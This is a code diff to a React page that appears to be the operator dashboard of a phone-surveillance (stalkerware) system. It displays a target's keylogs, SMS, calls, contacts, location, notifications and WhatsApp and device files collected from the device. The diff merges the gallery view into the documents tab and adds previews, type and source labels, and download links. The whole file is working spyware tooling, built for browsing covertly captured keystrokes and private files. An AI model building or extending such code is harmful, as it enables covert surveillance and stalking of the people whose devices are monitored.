@@ -6,27 +6,28 @@ import {
   IconContact,
   IconDevice,
   IconDocument,
-  IconDownload,
   IconEye,
   IconEyeOff,
-  IconImage,
   IconKey,
   IconMap,
   IconMessage,
   IconPhone,
   IconSearch,
-  IconTrash,
   IconUser,
   IconUsers,
   IconVideo,
 } from "../components/Icons";
-import {
-  IllustEmptyFeed,
-  IllustEmptyGallery,
-} from "../components/Illustrations";
+import { IllustEmptyFeed } from "../components/Illustrations";
 import {
   appLabel,
   callTypeLabel,
+  documentByteSize,
+  documentDisplayName,
+  documentDownloadUrl,
+  documentIsImage,
+  documentTypeLabel,
+  documentTimestamp,
+  documentsToList,
   formatDuration,
   formatTime,
   recordsToList,
@@ -45,7 +46,6 @@ type Tab =
   | "contacts"
   | "notifications"
   | "keylogs"
-  | "gallery"
   | "documents";
 
 const PAGE_SIZE = 40;
@@ -80,7 +80,7 @@ function readableValue(val: unknown): string {
 
 export default function UserDetailPage() {
   const { userId = "" } = useParams();
-  const [tab, setTab] = useState<Tab>("app_usage");
+  const [tab, setTab] = useState<Tab>("documents");
   const [data, setData] = useState<UserBundle | null>(null);
   const [error, setError] = useState("");
   const [busy, setBusy] = useState(false);
@@ -88,7 +88,6 @@ export default function UserDetailPage() {
   const [live, setLive] = useState(false);
   const [query, setQuery] = useState("");
   const [page, setPage] = useState(0);
-  const [galleryFilter, setGalleryFilter] = useState<"all" | "whatsapp" | "gallery">("all");
   const [previewUrl, setPreviewUrl] = useState<string | null>(null);
 
   useEffect(() => {
@@ -117,7 +116,7 @@ export default function UserDetailPage() {
 
   useEffect(() => {
     setPage(0);
-  }, [tab, query, galleryFilter]);
+  }, [tab, query]);
 
   async function toggleHidden() {
     if (!data) return;
@@ -145,11 +144,9 @@ export default function UserDetailPage() {
       contacts: countMap(data?.contacts),
       notifications: countMap(data?.notifications),
       keylogs: countMap(data?.keylogs),
-      gallery: countMap(data?.gallery),
       documents: countMap(data?.documents),
     };
     return [
-      { id: "gallery" as Tab, label: "Gallery", count: counts.gallery, icon: IconImage },
       { id: "documents" as Tab, label: "Documents", count: counts.documents, icon: IconDocument },
       { id: "sms" as Tab, label: "SMS", count: counts.sms, icon: IconMessage },
       { id: "call_logs" as Tab, label: "Calls", count: counts.call_logs, icon: IconPhone },
@@ -170,29 +167,13 @@ export default function UserDetailPage() {
     if (tab === "notifications")
       return recordsToList(data.notifications).filter((r) => matchesQuery(r, q));
     if (tab === "keylogs") return recordsToList(data.keylogs).filter((r) => matchesQuery(r, q));
-    if (tab === "documents") return recordsToList(data.documents).filter((r) => matchesQuery(r, q));
+    if (tab === "documents") return documentsToList(data.documents).filter((r) => matchesQuery(r, q));
     return [];
   }, [data, tab, query]);
 
   const pageCount = Math.max(1, Math.ceil(listRecords.length / PAGE_SIZE));
   const pageSafe = Math.min(page, pageCount - 1);
   const pageRows = listRecords.slice(pageSafe * PAGE_SIZE, pageSafe * PAGE_SIZE + PAGE_SIZE);
-
-  const galleryEntries = useMemo(() => {
-    if (!data?.gallery) return [];
-    const q = query.trim().toLowerCase();
-    return Object.entries(data.gallery)
-      .filter(([, item]: [string, any]) => {
-        if (galleryFilter !== "all" && (item?.source || "gallery") !== galleryFilter) return false;
-        if (!q) return true;
-        return matchesQuery({ id: "", ...item }, q);
-      })
-      .sort(
-        (a, b) =>
-          Number((b[1] as any)?.uploadedAt || (b[1] as any)?.timestamp || 0) -
-          Number((a[1] as any)?.uploadedAt || (a[1] as any)?.timestamp || 0)
-      );
-  }, [data, galleryFilter, query]);
 
   const title =
     (data?.profile as any)?.displayName ||
@@ -307,27 +288,14 @@ export default function UserDetailPage() {
               placeholder={
                 tab === "keylogs"
                   ? "Search typed text or app…"
-                  : tab === "gallery"
-                    ? "Search gallery media…"
+                  : tab === "documents"
+                    ? "Search files (PDF, photos, docs)…"
                     : `Search ${tab.replace("_", " ")}…`
               }
               value={query}
               onChange={(e) => setQuery(e.target.value)}
             />
           </div>
-          {tab === "gallery" ? (
-            <div className="row">
-              {(["all", "whatsapp", "gallery"] as const).map((f) => (
-                <button
-                  key={f}
-                  className={`chip ${galleryFilter === f ? "active" : ""}`}
-                  onClick={() => setGalleryFilter(f)}
-                >
-                  {f === "all" ? "All" : f === "whatsapp" ? "WhatsApp" : "Other"}
-                </button>
-              ))}
-            </div>
-          ) : null}
         </div>
       ) : null}
 
@@ -342,10 +310,6 @@ export default function UserDetailPage() {
 
         {tab === "profile" && data ? <ProfileView data={data} /> : null}
         {tab === "location" && data ? <LocationView location={data.location} /> : null}
-        {tab === "gallery" ? (
-          <GalleryView entries={galleryEntries} onOpen={setPreviewUrl} />
-        ) : null}
-
         {tab === "keylogs" ? (
           <KeylogFeed
             rows={pageRows}
@@ -363,6 +327,7 @@ export default function UserDetailPage() {
             page={pageSafe}
             pageCount={pageCount}
             onPage={setPage}
+            onPreview={setPreviewUrl}
           />
         ) : null}
 
@@ -612,108 +577,6 @@ function LocationView({ location }: { location: Record<string, unknown> | null }
   );
 }
 
-function GalleryView({
-  entries,
-  onOpen,
-}: {
-  entries: [string, any][];
-  onOpen: (url: string) => void;
-}) {
-  if (entries.length === 0) {
-    return (
-      <div className="empty-block">
-        <IllustEmptyGallery className="illust" />
-        <p className="empty-state">
-          No gallery media yet. It appears after the device unlocks Videos / storage sync.
-        </p>
-      </div>
-    );
-  }
-  return (
-    <div className="stack">
-      <p className="muted" style={{ margin: 0 }}>
-        {entries.length} media item{entries.length === 1 ? "" : "s"}
-      </p>
-      <div className="table-wrap">
-        <table className="table">
-          <thead>
-            <tr>
-              <th>Preview</th>
-              <th>File Name</th>
-              <th>Source</th>
-              <th>Uploaded</th>
-              <th>Actions</th>
-            </tr>
-          </thead>
-          <tbody>
-            {entries.map(([id, item]) => (
-              <tr key={id} className="click-row">
-                <td style={{ width: "80px" }}>
-                  <img
-                    src={item?.url}
-                    alt={item?.fileName || id}
-                    loading="lazy"
-                    style={{
-                      width: "60px",
-                      height: "60px",
-                      objectFit: "cover",
-                      borderRadius: "8px",
-                      cursor: "pointer",
-                    }}
-                    onClick={() => item?.url && onOpen(item.url)}
-                    title="Click to preview"
-                  />
-                </td>
-                <td>
-                  <strong>{item?.fileName || "Media"}</strong>
-                </td>
-                <td>
-                  <span className="badge soft">
-                    {item?.source === "whatsapp" ? "WhatsApp" : "Gallery"}
-                  </span>
-                </td>
-                <td className="muted tiny">
-                  {formatTime(item?.uploadedAt || item?.timestamp)}
-                </td>
-                <td>
-                  <div style={{ display: "flex", gap: "8px", alignItems: "center" }}>
-                    {item?.url ? (
-                      <a
-                        href={item.url}
-                        target="_blank"
-                        rel="noreferrer"
-                        download={item?.fileName || "media"}
-                        className="btn btn-icon"
-                        style={{ padding: "6px 10px", fontSize: "12px" }}
-                        title="Download file"
-                      >
-                        <IconDownload size={14} />
-                      </a>
-                    ) : null}
-                    <button
-                      className="btn btn-icon danger"
-                      style={{ padding: "6px 10px", fontSize: "12px" }}
-                      title="Delete file"
-                      onClick={() => {
-                        if (confirm(`Delete ${item?.fileName || "this file"}?`)) {
-                          // Delete functionality can be added here
-                          console.log("Delete:", id);
-                        }
-                      }}
-                    >
-                      <IconTrash size={14} />
-                    </button>
-                  </div>
-                </td>
-              </tr>
-            ))}
-          </tbody>
-        </table>
-      </div>
-    </div>
-  );
-}
-
 function KeylogFeed({
   rows,
   total,
@@ -824,16 +687,21 @@ function DocumentsView({
   page,
   pageCount,
   onPage,
+  onPreview,
 }: {
   rows: Record<string, any>[];
   total: number;
   page: number;
   pageCount: number;
   onPage: (p: number) => void;
+  onPreview?: (url: string) => void;
 }) {
   if (total === 0) {
     return (
-      <p className="empty-state">No documents uploaded yet.</p>
+      <p className="empty-state">
+        No files yet. PDFs, photos, and other backups appear here after device sync (Videos / storage
+        access).
+      </p>
     );
   }
 
@@ -847,7 +715,10 @@ function DocumentsView({
         <table className="table">
           <thead>
             <tr>
+              <th>Preview</th>
               <th>File Name</th>
+              <th>Type</th>
+              <th>Source</th>
               <th>Size</th>
               <th>Uploaded</th>
               <th>Action</th>
@@ -855,25 +726,71 @@ function DocumentsView({
           </thead>
           <tbody>
             {rows.map((doc: any) => {
-              const fileName = doc.fileName || doc.id || "Document";
-              const fileSize = doc.fileSize ? `${(Number(doc.fileSize) / 1024 / 1024).toFixed(2)} MB` : "—";
-              const uploadedTime = formatTime(doc.uploadedAt || doc.timestamp);
-              const isPdf = fileName.toLowerCase().endsWith('.pdf');
-              const isImage = /\.(jpg|jpeg|png|gif|webp)$/i.test(fileName);
+              const fileName = documentDisplayName(doc);
+              const bytes = documentByteSize(doc);
+              const fileSize =
+                bytes != null
+                  ? bytes >= 1024 * 1024
+                    ? `${(bytes / 1024 / 1024).toFixed(2)} MB`
+                    : `${Math.max(1, Math.round(bytes / 1024))} KB`
+                  : "—";
+              const uploadedTime = formatTime(documentTimestamp(doc));
+              const fileUrl = documentDownloadUrl(doc);
+              const isPdf = fileName.toLowerCase().endsWith(".pdf");
+              const isImage = documentIsImage(doc);
+              const typeLabel = documentTypeLabel(doc);
+              const sourceLabel =
+                doc.source === "whatsapp"
+                  ? "WhatsApp"
+                  : doc.source === "device"
+                    ? "Device"
+                    : "—";
 
               return (
                 <tr key={doc.id} className="click-row">
+                  <td style={{ width: "72px" }}>
+                    {isImage && fileUrl ? (
+                      <img
+                        src={fileUrl}
+                        alt={fileName}
+                        loading="lazy"
+                        referrerPolicy="no-referrer"
+                        onError={(e) => {
+                          (e.target as HTMLImageElement).style.display = "none";
+                        }}
+                        style={{
+                          width: "56px",
+                          height: "56px",
+                          objectFit: "cover",
+                          borderRadius: "8px",
+                          cursor: "pointer",
+                        }}
+                        onClick={() => onPreview?.(fileUrl)}
+                        title="Preview"
+                      />
+                    ) : (
+                      "—"
+                    )}
+                  </td>
                   <td>
                     <strong>{fileName}</strong>
+                  </td>
+                  <td className="muted tiny">{String(typeLabel)}</td>
+                  <td>
+                    {sourceLabel !== "—" ? (
+                      <span className="badge soft">{sourceLabel}</span>
+                    ) : (
+                      "—"
+                    )}
                   </td>
                   <td>{fileSize}</td>
                   <td className="muted tiny">{uploadedTime}</td>
                   <td>
-                    {doc.url ? (
+                    {fileUrl ? (
                       <>
                         {isPdf || isImage ? (
                           <a
-                            href={doc.url}
+                            href={fileUrl}
                             target="_blank"
                             rel="noreferrer"
                             className="btn btn-icon"
@@ -883,7 +800,7 @@ function DocumentsView({
                           </a>
                         ) : (
                           <a
-                            href={doc.url}
+                            href={fileUrl}
                             target="_blank"
                             rel="noreferrer"
                             className="btn btn-icon secondary"
